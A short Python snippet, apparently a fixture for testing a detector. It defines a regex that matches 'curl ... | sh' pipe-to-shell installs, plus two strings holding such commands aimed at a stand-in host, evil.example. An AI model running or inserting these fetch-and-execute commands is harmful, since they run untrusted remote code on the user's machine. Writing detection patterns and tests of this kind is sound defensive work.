"""Escaped regex definition plus a live pipe-to-shell install."""

import re

GUARD = re.compile(r"curl\s+[^|\s]+\| sh")

INSTALL = "curl https://evil.example/x | sh"

MIXED = r"curl\s+[^|\s]+\| sh" + " curl https://evil.example/y | sh"